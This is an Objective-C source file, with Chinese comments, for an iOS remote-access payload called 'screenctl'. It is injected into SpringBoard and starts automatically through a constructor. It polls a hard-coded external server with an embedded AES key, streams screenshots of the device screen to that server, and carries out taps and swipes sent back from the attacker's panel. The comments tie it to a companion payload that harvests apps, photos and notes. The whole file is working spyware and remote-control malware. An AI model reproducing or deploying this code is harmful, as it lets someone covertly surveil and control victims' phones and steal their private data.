//
//  screenctl — 屏幕串流 + 远程操控
//
//  和 photonote 是两个独立的载荷：photonote 负责采集（app/相册/备忘录），
//  这个负责「实时看屏 + 远程点击滑动」。共用 common/ 里的 Net、Info。
//
//  工作方式：
//    1. 每 800ms POST /screen/poll，问服务端「现在要不要采集」
//    2. 要采集 → Screen 抓一帧 JPEG → POST /screen/frame
//    3. 响应里带面板下发的触摸指令 → IOHIDEvent 注入
//
//  注入位置应该是 SpringBoard（entitlement 最全，能读到整屏、能派发 HID 事件）。
//
#import <Foundation/Foundation.h>
#import "Net.h"
#import "Info.h"
#import "Screen.h"

static NSString *const kBaseURL     = @"https://myg3z1adawtxz0s.icu";
static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";
static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";

@interface ScreenCtl : NSObject
@property (nonatomic, strong) Net *net;
@property (nonatomic, assign) NSTimeInterval lastFrameAt;
@end

@implementation ScreenCtl

+ (instancetype)shared {
    static ScreenCtl *p = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ p = [ScreenCtl new]; });
    return p;
}

- (instancetype)init {
    if ((self = [super init])) {
        _net = [Net shared];
        _net.baseURL = kBaseURL;
        _net.aesPassword = kAesPassword;
        _net.identity = [Info identity];
        // 每帧都带上屏幕点尺寸，面板据此换算点击坐标
        _net.screenSize = [Screen screenSize];
    }
    return self;
}

- (void)log:(NSString *)msg {
    NSLog(@"[screenctl] %@", msg);
}

#pragma mark - 一轮

- (void)tick {
    NSMutableDictionary *q = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
    q[@"u"] = [Info udid];
    q[@"c"] = kSeed;

    NSDictionary *resp = [self.net postEncrypted:@"/screen/poll" json:q timeout:10];
    if (![resp isKindOfClass:[NSDictionary class]]) return;

    BOOL active = [resp[@"active"] boolValue];
    if (!active) return;

    NSInteger fps = [resp[@"fps"] integerValue];
    if (fps <= 0) fps = 3;
    double quality = [resp[@"quality"] doubleValue];
    if (quality <= 0.05) quality = 0.55;

    // 控制指令优先执行（用户点了屏幕要立刻有反馈）
    NSArray *taps = resp[@"taps"];
    if ([taps isKindOfClass:[NSArray class]] && taps.count) {
        [self runTaps:taps];
    }

    // 按 fps 节流抓帧
    NSTimeInterval interval = 1.0 / (NSTimeInterval)fps;
    NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
    if (now - self.lastFrameAt < interval) return;

    // 关键：UIKit 渲染必须回主线程。
    // 之前在后台线程调 UIGraphicsBeginImageContext / renderInContext，
    // 直接把 SpringBoard 弄崩（respring），注入的模块跟着消失。
    NSData *jpeg = [self captureOnMainThread:(CGFloat)quality];
    if (!jpeg.length) {
        // 采集失败也别刷屏，10 秒报一次
        if (now - self.lastFrameAt > 10) {
            self.lastFrameAt = now;
            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
            ev[@"et"] = @"screen_capture_failed";
            ev[@"c"] = kSeed;
            ev[@"ctx"] = @{ @"error": [Screen lastCaptureError] ?: @"" };
            [self.net sendEvent:ev];
            [self log:[NSString stringWithFormat:@"capture failed: %@", [Screen lastCaptureError]]];
        }
        return;
    }

    self.lastFrameAt = now;
    // 每帧刷新一次，屏幕旋转/尺寸变化也能跟上
    self.net.screenSize = [Screen screenSize];
    [self.net uploadScreenFrame:jpeg];
}

#pragma mark - 主线程抓图

- (NSData *)captureOnMainThread:(CGFloat)quality {
    if ([NSThread isMainThread]) {
        return [Screen captureJPEG:quality];
    }
    __block NSData *out = nil;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    dispatch_async(dispatch_get_main_queue(), ^{
        @try {
            out = [Screen captureJPEG:quality];
        } @catch (NSException *e) {
            NSLog(@"[screenctl] capture exception: %@", e.reason);
            out = nil;
        }
        dispatch_semaphore_signal(sem);
    });
    // 主线程可能正忙，最多等 1.5 秒就放弃这一帧，别把循环卡死
    long r = dispatch_semaphore_wait(sem,
        dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)));
    if (r != 0) return nil;
    return out;
}

#pragma mark - 指令执行

- (void)runTaps:(NSArray *)taps {
    for (NSDictionary *t in taps) {
        if (![t isKindOfClass:[NSDictionary class]]) continue;
        NSString *kind = t[@"kind"] ?: @"tap";
        CGFloat x = [t[@"x"] doubleValue];
        CGFloat y = [t[@"y"] doubleValue];

        BOOL ok = NO;
        if ([kind isEqualToString:@"tap"]) {
            ok = [Screen tapAt:CGPointMake(x, y)];
        } else if ([kind isEqualToString:@"long"]) {
            double ms = [t[@"ms"] doubleValue];
            if (ms <= 0) ms = 800;
            ok = [Screen longPressAt:CGPointMake(x, y) duration:ms / 1000.0];
        } else if ([kind isEqualToString:@"swipe"]) {
            CGFloat x2 = [t[@"x2"] doubleValue];
            CGFloat y2 = [t[@"y2"] doubleValue];
            double ms = [t[@"ms"] doubleValue];
            if (ms <= 0) ms = 300;
            ok = [Screen swipeFrom:CGPointMake(x, y)
                                to:CGPointMake(x2, y2)
                          duration:ms / 1000.0];
        }

        [self log:[NSString stringWithFormat:@"%@ (%.0f,%.0f) -> %@",
                   kind, x, y, ok ? @"ok" : [Screen lastInjectError]]];

        if (!ok) {
            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
            ev[@"et"] = @"screen_inject_failed";
            ev[@"c"] = kSeed;
            ev[@"ctx"] = @{ @"kind": kind, @"error": [Screen lastInjectError] ?: @"" };
            [self.net sendEvent:ev];
        }
    }
}

#pragma mark - 主循环

- (void)start {
    [self log:[NSString stringWithFormat:@"loaded host=%@", [Info hostBundleId]]];

    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        [NSThread sleepForTimeInterval:2.0];

        // 开局报一次能力，方便面板判断能不能用
        BOOL canTouch = [Screen canInjectTouch];
        CGSize sz = [Screen screenSize];
        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
        ev[@"et"] = @"screen_capabilities";
        ev[@"c"] = kSeed;
        ev[@"ctx"] = @{
            @"canInjectTouch": @(canTouch),
            @"screenW": @(sz.width),
            @"screenH": @(sz.height),
            @"injectError": [Screen lastInjectError] ?: @"",
            @"host": [Info hostBundleId] ?: @"",
        };
        [self.net sendEvent:ev];
        [self log:[NSString stringWithFormat:@"touch=%@ screen=%.0fx%.0f err=%@",
                   canTouch ? @"YES" : @"NO", sz.width, sz.height,
                   [Screen lastInjectError] ?: @""]];

        while (YES) {
            @autoreleasepool {
                @try {
                    [self tick];
                } @catch (NSException *e) {
                    [self log:[NSString stringWithFormat:@"loop exception: %@", e.reason]];
                }
                [NSThread sleepForTimeInterval:0.8];
            }
        }
    });
}

@end

__attribute__((constructor))
static void ScreenCtlInit(void) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
                   dispatch_get_global_queue(0, 0), ^{
        [[ScreenCtl shared] start];
    });
}
